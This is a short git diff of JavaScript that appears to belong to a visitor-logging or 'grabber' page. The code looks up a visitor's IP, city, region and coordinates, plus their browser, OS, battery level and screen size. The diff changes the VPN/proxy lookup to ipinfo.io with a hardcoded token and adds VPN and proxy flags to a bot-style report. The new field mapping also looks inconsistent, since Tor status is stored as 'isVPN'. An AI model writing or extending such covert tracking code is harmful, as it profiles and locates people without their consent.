@@ -103,11 +103,11 @@ fetch('https://ipapi.co/json/')
   
     let TypeInternet = navigator.connection.effectiveType;
         
-fetch(`https://api.proxycheck.io/v2/${ip}?vpn=1`)
+fetch(`https://ipinfo.io/${ip}/json?token=afae6637fcf7bf`)
     .then(response => response.json())
     .then(data => {
-        isProxy = data.proxy ? true : false;
-        isVPN = data.vpn ? true : false;
+        isProxy = data.threat.proxy ? true : false;
+        isVPN = data.threat.is_tor ? true : false;
     })
     .catch(error => {
         console.error('Error:', error);
@@ -121,10 +121,12 @@ fetch(`https://api.proxycheck.io/v2/${ip}?vpn=1`)
     *├ City: ${city}*
     *├ Region: ${region}*
     *├ Timezone IP: ${time}*
+    *├ Vpn: ${isVPN}*
+    *├ Proxy: ${isProxy}*
     *├ Coordinates: ${longitude} ${latitude},*
       * System 🖥*
     *├ Browser: ${browser}*
-    *├ + Os: ${osname}*
+    *├ Os: ${osname}*
     *├ Battery: ${batteryLevel}%*
     *├ Screen resolution: ${screenWidth}x${screenHeight}*
     *├ Time: ${formattedTime}*
